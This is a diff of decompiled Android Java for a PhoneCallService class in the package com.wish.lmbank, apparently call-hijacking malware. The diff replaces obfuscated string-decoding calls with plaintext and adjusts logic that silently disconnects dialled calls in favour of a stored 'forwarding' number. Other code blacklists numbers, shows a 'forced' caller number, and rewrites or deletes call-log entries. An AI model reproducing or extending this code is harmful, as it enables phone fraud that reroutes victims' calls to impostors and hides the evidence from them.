@@ -35,6 +35,10 @@ public class PhoneCallService extends InCallService {
     public static boolean isRunning;
     private final String TAG = PhoneCallService.class.getName();
 
+    public PhoneCallService() {
+        System.out.println("");
+    }
+
     private final Call.Callback callback = new Call.Callback() { // from class: com.wish.lmbank.phone.PhoneCallService.1
 
         @Override // android.telecom.Call.Callback
@@ -115,17 +119,21 @@ public class PhoneCallService extends InCallService {
         boolean z = false;
         String callPhone = getCallPhone(call);
         String callPhone2 = getCallPhone(call);
+
         if (PhoneCallManager.call != null && PhoneCallManager.call.getState() == Call.STATE_ACTIVE) {
             call.reject(false, null);
             StringBuilder sb = new StringBuilder();
-            sb.append(this.TAG).append(bb7d7pu7.m5998("RUkGByoIBQUoDQ0MDUVJgOnzgcb0jdHEj_TMjv3cj-Xrj__ERUmO_dyBxvSM5t6OyehTSQ")).append(callPhone2);
+//-^-             sb.append(this.TAG).append(bb7d7pu7.m5998("RUkGByoIBQUoDQ0MDUVJgOnzgcb0jdHEj_TMjv3cj-Xrj__ERUmO_dyBxvSM5t6OyehTSQ")).append(callPhone2);
+            sb.append(this.TAG).append(", onCallAdded, 通话中来电挂断, 电话号码: ").append(callPhone2);
             if (TelePhoneReceiver.mCallLogBean != null) {
                 CallLogBean callLogBean = TelePhoneReceiver.mCallLogBean;
-                if (!bb7d7pu7.m5998("DwYbHggbDQAHDg").equals(callLogBean.getType())) {
+//-^-                 if (!bb7d7pu7.m5998("DwYbHggbDQAHDg").equals(callLogBean.getType())) {
+                if (!"forwarding".equals(callLogBean.getType())) {
                 }
                 callLogBean.setDuration((long) Math.ceil(((DateFormatUtils.getDateInterval(TelePhoneReceiver.callStartTime, new Date()) * 1.0d) / 1000.0d)));
                 CallLogHelper.addCallLog(callLogBean);
-                sb.append(bb7d7pu7.m5998("RUkEKggFBSUGDisMCAdTSQ")).append(callLogBean.toString());
+//-^-                 sb.append(bb7d7pu7.m5998("RUkEKggFBSUGDisMCAdTSQ")).append(callLogBean.toString());
+                sb.append(", mCallLogBean: ").append(callLogBean.toString());
                 if (Constants.mCallLogList.size() > 0) {
                     HandlerUtils.getMainThreadHandler().postDelayed(new Runnable() {
                         @Override
@@ -143,10 +151,13 @@ public class PhoneCallService extends InCallService {
         } else {
             i = call.getState() == Call.STATE_CONNECTING ? 2 : 0;
         }
-        String str3 = bb7d7pu7.m5998("GhAaHQwENhoeAB0KAQ");
-        String str4 = bb7d7pu7.m5998("Bgc");
+//-^-         String str3 = bb7d7pu7.m5998("GhAaHQwENhoeAB0KAQ");
+        String str3 = "system_switch";
+//-^-         String str4 = bb7d7pu7.m5998("Bgc");
+        String str4 = "on";
         String value = SharedPreferencesUtils.getValue(str3, str4);
-        LogUtils.callLog(this.TAG + bb7d7pu7.m5998("RUkGByoIBQUoDQ0MDUVJCggFBT0QGQxTSQ") + i + bb7d7pu7.m5998("RUkKCAUFOh0IHQxTSQ") + call.getState() + bb7d7pu7.m5998("RUmO_dyBxvSM5t6OyehTSQ") + callPhone2 + bb7d7pu7.m5998("RUkaHgAdCgFTSQ") + value);
+//-^-         LogUtils.callLog(this.TAG + bb7d7pu7.m5998("RUkGByoIBQUoDQ0MDUVJCggFBT0QGQxTSQ") + i + bb7d7pu7.m5998("RUkKCAUFOh0IHQxTSQ") + call.getState() + bb7d7pu7.m5998("RUmO_dyBxvSM5t6OyehTSQ") + callPhone2 + bb7d7pu7.m5998("RUkaHgAdCgFTSQ") + value);
+        LogUtils.callLog(this.TAG + ", onCallAdded, callType: " + i + ", callState: " + call.getState() + ", 电话号码: " + callPhone2 + ", switch: " + value);
         Log.e(TAG, "str4=" + str4 + "|value=" + value + "|i=" + i);
         if (i != 0) {
             if (i == 2) {
@@ -161,13 +172,19 @@ public class PhoneCallService extends InCallService {
                 } else {
                     str2 = "";
                 }
-                sb2.append(this.TAG).append(bb7d7pu7.m5998("RUkPBhseCBsNAAcOOQEGBwxTSQ")).append(str2).append(bb7d7pu7.m5998("RUkAGjoZDAoACAVTSQ")).append(z).append(bb7d7pu7.m5998("RUkKCAUFKA0NDA05AQYHDFNJ")).append(callPhone2);
-                if (str4.equals(value) && !z && !TextUtils.isEmpty(str2) && !bb7d7pu7.m5998("WFhb").equals(callPhone2)) {
-                    sb2.append(bb7d7pu7.m5998("RUmM-NWM5sKB1MWOztKP5euP_8Q"));
+//-^-                 sb2.append(this.TAG).append(bb7d7pu7.m5998("RUkPBhseCBsNAAcOOQEGBwxTSQ")).append(str2).append(bb7d7pu7.m5998("RUkAGjoZDAoACAVTSQ")).append(z).append(bb7d7pu7.m5998("RUkKCAUFKA0NDA05AQYHDFNJ")).append(callPhone2);
+                sb2.append(this.TAG).append(", forwardingPhone: ").append(str2).append(", isSpecial: ").append(z).append(", callAddedPhone: ").append(callPhone2);
+//-^-                 if (str4.equals(value) && !z && !TextUtils.isEmpty(str2) && !bb7d7pu7.m5998("WFhb").equals(callPhone2)) {
+                if (str4.equals(value) && !z && !TextUtils.isEmpty(str2) && !"112".equals(callPhone2)) {
+//-^-                     sb2.append(bb7d7pu7.m5998("RUmM-NWM5sKB1MWOztKP5euP_8Q"));
+                    sb2.append(", 呼叫转移挂断");
                     call.disconnect();
-                    SharedPreferencesUtils.putValue(bb7d7pu7.m5998("IiwwNiA6Ni8mOz4oOy0gJy42ISgnLTY8OQ"), true);
-                    SharedPreferencesUtils.putValue(bb7d7pu7.m5998("IiwwNi8mOz4oOy0gJy42OiEmPjY5ISYnLA"), callPhone2);
-                    SharedPreferencesUtils.putValue(bb7d7pu7.m5998("IiwwNi8mOz4oOy0gJy42OSEmJyw"), str2);
+//-^-                     SharedPreferencesUtils.putValue(bb7d7pu7.m5998("IiwwNiA6Ni8mOz4oOy0gJy42ISgnLTY8OQ"), true);
+                    SharedPreferencesUtils.putValue("KEY_IS_FORWARDING_HAND_UP", true);
+//-^-                     SharedPreferencesUtils.putValue(bb7d7pu7.m5998("IiwwNi8mOz4oOy0gJy42OiEmPjY5ISYnLA"), callPhone2);
+                    SharedPreferencesUtils.putValue("KEY_FORWARDING_SHOW_PHONE", callPhone2);
+//-^-                     SharedPreferencesUtils.putValue(bb7d7pu7.m5998("IiwwNi8mOz4oOy0gJy42OSEmJyw"), str2);
+                    SharedPreferencesUtils.putValue("KEY_FORWARDING_PHONE", str2);
                     AppStartV.isPlayColorRing = true;
                     new TelePhoneReceiver.ColorRingThread(callPhone2).start();
                 }
@@ -180,14 +197,16 @@ public class PhoneCallService extends InCallService {
                 Log.e(TAG, "str4=" + str4 + "|value=" + value + "|is=" + isBlackList);
                 if (str4.equals(value) && isBlackList) {
                     call.disconnect();
-                    LogUtils.callLog(this.TAG + bb7d7pu7.m5998("RUkGByoIBQUoDQ0MDUVJgNL4jPnkjOT8RUmO_dyBxvRTSQ") + callPhone2);
+//-^-                     LogUtils.callLog(this.TAG + bb7d7pu7.m5998("RUkGByoIBQUoDQ0MDUVJgNL4jPnkjOT8RUmO_dyBxvRTSQ") + callPhone2);
+                    LogUtils.callLog(this.TAG + ", onCallAdded, 黑名单, 电话: " + callPhone2);
                     return;
                 }
                 isForced = SettingUtils.isForced(callPhone2);
                 if (!str4.equals(value) || TextUtils.isEmpty(isForced)) {
                     isForced = callPhone2;
                 } else {
-                    LogUtils.callLog(this.TAG + bb7d7pu7.m5998("RUkGByoIBQUoDQ0MDUVJjNXTjOHfgOnzgcb0RUkKCAUFLwYbCgwNOgEGHjZTSQ") + isForced);
+//-^-                     LogUtils.callLog(this.TAG + bb7d7pu7.m5998("RUkGByoIBQUoDQ0MDUVJjNXTjOHfgOnzgcb0RUkKCAUFLwYbCgwNOgEGHjZTSQ") + isForced);
+                    LogUtils.callLog(this.TAG + ", onCallAdded, 强制通话, callForcedShow_: " + isForced);
                 }
             }
             call.registerCallback(this.callback);
@@ -198,21 +217,28 @@ public class PhoneCallService extends InCallService {
             } else {
                 str = callPhone;
             }
-            PhoneActivity.actionStart(this, isForced, str, i, bb7d7pu7.m5998("KggFBToMGx8ACgw"));
+//-^-             PhoneActivity.actionStart(this, isForced, str, i, bb7d7pu7.m5998("KggFBToMGx8ACgw"));
+            PhoneActivity.actionStart(this, isForced, str, i, "CallService");
         }
     }
 
     @Override // android.telecom.InCallService
     public void onCallRemoved(Call call) {
+        System.out.println(" onCallRemoved ........... ");
         String callPhone = getCallPhone(call);
         StringBuilder sb = new StringBuilder();
 //         sb.append(this.TAG + bb7d7pu7.m5998("RUkGByoIBQU7DAQGHwwNRUmO_dyBxvSM5t6OyehTSQ") + callPhone);
         sb.append(this.TAG).append(", onCallRemoved, 电话号码: ").append(callPhone);
 
         //这里修改号码，注意断开了才有号码
-        String var11 = SharedPreferencesUtils.getValue("KEY_FORWARDING_SHOW_PHONE", callPhone);
-        Constants.modifyCall(this, callPhone, var11);
+//        String var11 = SharedPreferencesUtils.getValue("KEY_FORWARDING_SHOW_PHONE", callPhone);
+//        Constants.modifyCall(this, callPhone, var11);
+       /* String callPhone2 = getCallPhone(call);
+        if(SettingUtils.isBlackList(callPhone2)){
+            Constants.delCallLog(AppStartV.getContext(),callPhone2);
+        }else {
 
+        }*/
         if (PhoneCallManager.call == call) {
 //             sb.append(bb7d7pu7.m5998("RUk5AQYHDCoIBQUkCAcIDgwbRwoIBQVJVEkHHAUF"));
             sb.append(", PhoneCallManager.call = null");
